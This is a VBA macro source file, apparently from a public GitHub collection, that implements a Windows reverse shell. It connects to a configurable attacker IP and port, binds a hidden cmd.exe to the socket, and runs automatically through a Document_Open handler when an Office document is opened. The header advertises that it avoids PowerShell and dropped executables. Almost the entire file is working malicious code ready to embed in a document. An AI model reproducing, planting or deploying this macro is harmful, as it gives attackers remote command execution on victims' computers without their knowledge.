' https://github.com/JohnWoodman/VBA-Macro-Projects
'Reverse shell using only Windows API calls, no Powershell, shellcode injection, or dropping exe's.
'Author: John Woodman
'Twitter: @JohnWoodman15

'Replace with your IP and Port
Const ip = "192.168.43.1"
Const port = "1337"

Const INVALID_SOCKET = -1
Const WSADESCRIPTION_LEN = 256
Const SOCKET_ERROR = -1

Private Type WSADATA
    wVersion As Integer
    wHighVersion As Integer
    szDescription(0 To WSADESCRIPTION_LEN) As Byte
    szSystemStatus(0 To WSADESCRIPTION_LEN) As Byte
    iMaxSockets As Integer
    iMaxUdpDg As Integer
    lpVendorInfo As Long
End Type

Private Type ADDRINFO
    ai_flags As Long
    ai_family As Long
    ai_socktype As Long
    ai_protocol As Long
    ai_addrlen As Long
    ai_canonName As LongPtr
    ai_addr As LongPtr
    ai_next As LongPtr
End Type

Private Type STARTUPINFOA
    cb As Long
    lpReserved As String
    lpDesktop As String
    lpTitle As String
    dwX As Long
    dwY As Long
    dwXSize As Long
    dwYSize As Long
    dwXCountChars As Long
    dwYCountChars As Long
    dwFillAttribute As Long
    dwFlags As Long
    wShowWindow As Integer
    cbReserved2 As Integer
    lpReserved2 As String
    hStdInput As LongPtr
    hStdOutput As LongPtr
    hStdError As LongPtr
End Type

Private Type PROCESS_INFORMATION
    hProcess As LongPtr
    hThread As LongPtr
    dwProcessId As Long
    dwThreadId As Long
End Type

Enum af
    AF_UNSPEC = 0
    AF_INET = 2
    AF_IPX = 6
    AF_APPLETALK = 16
    AF_NETBIOS = 17
    AF_INET6 = 23
    AF_IRDA = 26
    AF_BTH = 32
End Enum

Enum sock_type
    SOCK_STREAM = 1
    SOCK_DGRAM = 2
    SOCK_RAW = 3
    SOCK_RDM = 4
    SOCK_SEQPACKET = 5
End Enum

Private Declare PtrSafe Function WSAStartup Lib "ws2_32.dll" (ByVal wVersionRequested As Integer, ByRef data As WSADATA) As Long
Private Declare PtrSafe Function connect Lib "ws2_32.dll" (ByVal socket As LongPtr, ByVal SOCKADDR As LongPtr, ByVal namelen As Long) As Long
Private Declare PtrSafe Sub WSACleanup Lib "ws2_32.dll" ()
Private Declare PtrSafe Function GetAddrInfo Lib "ws2_32.dll" Alias "getaddrinfo" (ByVal NodeName As String, ByVal ServName As String, ByVal lpHints As LongPtr, lpResult As LongPtr) As Long
Private Declare PtrSafe Function closesocket Lib "ws2_32.dll" (ByVal socket As LongPtr) As Long
Private Declare PtrSafe Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (Destination As Any, Source As Any, ByVal Length As Long)
Private Declare PtrSafe Function WSAGetLastError Lib "ws2_32.dll" () As Long
Private Declare PtrSafe Function CreateProc Lib "kernel32" Alias "CreateProcessA" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, ByVal lpProcessAttributes As Any, ByVal lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, ByVal lpEnvironment As LongPtr, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFOA, lpProcessInformation As PROCESS_INFORMATION) As LongPtr
Private Declare PtrSafe Sub ZeroMemory Lib "kernel32" Alias "RtlZeroMemory" (Destination As STARTUPINFOA, ByVal Length As Long)
Private Declare PtrSafe Function WSASocketA Lib "ws2_32.dll" (ByVal af As Long, ByVal t As Long, ByVal protocol As Long, lpProtocolInfo As Any, ByVal g As Long, ByVal dwFlags As Long) As Long

Function revShell()
    Dim m_wsaData As WSADATA
    Dim m_RetVal As Integer
    Dim m_Hints As ADDRINFO
    Dim m_ConnSocket As LongPtr: m_ConnSocket = INVALID_SOCKET
    Dim pAddrInfo As LongPtr
    Dim RetVal As Long
    Dim lastError As Long
    Dim iRC As Long
    Dim MAX_BUF_SIZE As Integer: MAX_BUF_SIZE = 512

    RetVal = WSAStartup(MAKEWORD(2, 2), m_wsaData)
    If (RetVal <> 0) Then
        MsgBox "WSAStartup failed with error " & RetVal, WSAGetLastError()
        Call WSACleanup
        Exit Function
    End If
    
    m_Hints.ai_family = af.AF_UNSPEC
    m_Hints.ai_socktype = sock_type.SOCK_STREAM

    RetVal = GetAddrInfo(ip, port, VarPtr(m_Hints), pAddrInfo)
    If (RetVal <> 0) Then
        MsgBox "Cannot resolve address " & ip & " and port " & port & ", error " & RetVal, WSAGetLastError()
        Call WSACleanup
        Exit Function
    End If

    m_Hints.ai_next = pAddrInfo
    Dim connected As Boolean: connected = False
    Do While m_Hints.ai_next > 0
        CopyMemory m_Hints, ByVal m_Hints.ai_next, LenB(m_Hints)

        m_ConnSocket = WSASocketA(m_Hints.ai_family, m_Hints.ai_socktype, m_Hints.ai_protocol, ByVal 0&, 0, 0)
        
        If (m_ConnSocket = INVALID_SOCKET) Then
            revShell = False
        Else
            Dim connectionResult As Long

            connectionResult = connect(m_ConnSocket, m_Hints.ai_addr, m_Hints.ai_addrlen)

            If connectionResult <> SOCKET_ERROR Then
                connected = True
                Exit Do
            End If
            
            closesocket (m_ConnSocket)
            revShell = False
        End If
    Loop

    If Not connected Then
        revShell = False
        RetVal = closesocket(m_ConnSocket)
        Call WSACleanup
        Exit Function
    End If
    
    Dim si As STARTUPINFOA
    ZeroMemory si, Len(si)
    si.cb = Len(si)
    si.dwFlags = &H100
    si.hStdInput = m_ConnSocket
    si.hStdOutput = m_ConnSocket
    si.hStdError = m_ConnSocket
    Dim pi As PROCESS_INFORMATION
    Dim worked As LongPtr
    Dim test As Long
    worked = CreateProc(vbNullString, "cmd", ByVal 0&, ByVal 0&, True, &H8000000, 0, vbNullString, si, pi)
    revShell = worked
End Function

Public Function MAKEWORD(Lo As Byte, Hi As Byte) As Integer
    MAKEWORD = Lo + Hi * 256& Or 32768 * (Hi > 127)
End Function

Private Sub Document_Open()
    Dim success As Boolean
    success = revShell()
End Sub
